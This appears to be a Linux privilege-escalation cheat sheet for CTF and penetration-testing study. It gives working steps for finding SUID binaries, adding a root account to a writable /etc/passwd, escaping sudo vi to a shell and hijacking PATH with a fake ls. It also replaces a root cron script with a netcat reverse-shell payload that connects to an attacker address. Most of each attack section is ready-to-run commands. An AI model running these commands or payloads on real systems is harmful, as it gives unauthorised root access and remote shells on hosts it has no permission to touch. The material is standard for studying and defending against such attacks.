## __Summary__

- [__Abusing SUID/GUID Files__](#Abusing-SUID/GUID-Files)
- [__Exploiting a writeable /etc/passwd__](#Exploiting-a-writeable-/etc/passwd)
- [__Escaping Vi Editor__](#Escaping-Vi-Editor)
- [__Exploiting Crontab__](#Exploiting-Crontab)
- [__Exploiting PATH variable__](#Exploiting-PATH-variable)

# __Abusing SUID/GUID Files__

## __Download LinEnum.sh__

```
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

## __What is an SUID binary?__

As we all know in Linux everything is a file, including directories and devices which have permissions to allow or restrict three operations i.e. read/write/execute. So when you set permission for any file, you should be aware of the Linux users to whom you allow or restrict all three permissions. Take a look at the following demonstration of how maximum privileges (rwx-rwx-rwx) look:

```
r=read
w=write
x=execute
```

```
user    group     others

rwx      rwx       rwx

421      421       421
```

The maximum number of bit that can be used to set permission for each user is 7, which is a combination of read (4) write (2) and execute (1) operation. For example, if you set permissions using `chmod` as `755`, then it will be: rwxr-xr-x.

But when special permission is given to each user it becomes SUID or SGID. When extra bit `4` is set to user (Owner) it becomes `SUID` (Set user ID) and when bit `2` is set to group it becomes `SGID` (Set Group ID).

Therefore, the permissions to look for when looking for SUID is:

```
SUID:

rws-rwx-rwx

GUID:

rwx-rws-rwx
```

## __Finding SUID Binaries__

```
find / -perm -u=s -type f 2>/dev/null
# -perm - searches for files with specific permissions
# -u=s - any of the permission bits mode are set for the file. Symbolic modes are accepted in this form
```

# __Exploiting a writeable /etc/passwd__

```
test:x:0:0:root:/root:/bin/bash

1. Username
2. Password: An x character indicates that encrypted password is stored in /etc/shadow file.
3. User ID (UID): UID 0 (zero) is reserved for root and UIDs 1-99 are reserved for other predefined accounts.
4. Group ID (GID): The primary group ID (stored in /etc/group file)
5. User ID Info
6. Home Directory
7. Command/shell
```

It's simple really, if we have a writable /etc/passwd file, we can write a new line entry according to the above formula and create a new user! We add the password hash of our choice, and set the UID, GID and shell to root. Allowing us to log in as our own root user!

## __Steps to reproduce__

Before we add our new user, we first need to create a compliant password hash to add!

```
openssl passwd -1 -salt [salt] [password]
openssl passwd -1 -salt new 123
```

Now we need to take this value, and create a new root user account.

```
new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:/root:/bin/bash
```

Now we have to add that entry to the end of the /etc/passwd.

# __Escaping Vi Editor__

```
sudo -l
(root) NOPASSWD: /usr/bin/vi
```

 GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions. It provides a really useful breakdown of how to exploit a misconfigured binary and is the first place you should look if you find one on a CTF or Pentest.

https://gtfobins.github.io/

All we need to do is open vi as root, by typing `sudo vi` into the terminal.

Now, we have to type `:!sh` to open a shell!

# __Exploiting Crontab__

## __How to view what Cronjobs are active__

We can use the command `cat /etc/crontab` to view what cron jobs are scheduled. This is something we should always check manually whenever we get a chance, especially if LinEnum, or a similar script, doesn't find anything.

## __Format of a Cronjob__

```
# = ID

m = Minute

h = Hour

dom = Day of the month

mon = Month

dow = Day of the week

user = What user the command will run as

command = What command should be run
```

```
#  m   h dom mon dow user  command
17 *   1  *   *   *  root  cd / && run-parts --report /etc/cron.hourly
```

## __Exploitation__

We create a payload:

```
msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R
```

Lets replace the contents of the file with our payload using:

```
echo "mkfifo /tmp/zcmh; nc LOCALIP 8888 0</tmp/zcmh | /bin/sh >/tmp/zcmh 2>&1; rm /tmp/zcmh" > randomscript.sh
```


After copying the code into randomscript.sh file we wait for cron to execute the file, and start our netcat listener using:

```
nc -lvp 8888
```

and wait for our shell to land.

# __Exploiting PATH variable__

It is very simple to view the Path of the relevant user with help of the command `echo $PATH`.

## __How does this let us escalate privileges?__

We can re-write the PATH variable to a location of our choosing! So when the SUID binary calls the system shell to run an executable, it runs one that we've written instead!

As with any SUID file, it will run this command with the same privileges as the owner of the SUID file! If this is root, using this method we can run whatever commands we like as root!

## __Exploitation__

We know that there is a script called `random` that, when executed, launches the command `ls` (this script was created by root).
Our goal is to create an imitation executable to open a bash shell.

```
echo "[whatever command we want to run]" > [name of the executable we're imitating]
```

```
cd /tmp
echo "/bin/bash" > ls
chmod +x ls
```

Now, we need to change the PATH variable, so that it points to the directory where we have our imitation `ls` stored! We do this using the command `export PATH=/tmp:$PATH`.

> The real `ls` is in the following path: /bin/ls

Now we only have to launch the script again so that a shell is executed as root.

Once we have finished the exploit, we can exit out of root and use `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH` to reset the PATH variable back to default, letting us use "ls" again!

# __Resources__

https://pentestlab.blog/2017/09/25/suid-executables/

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md

https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html

https://payatu.com/guide-linux-privilege-escalation

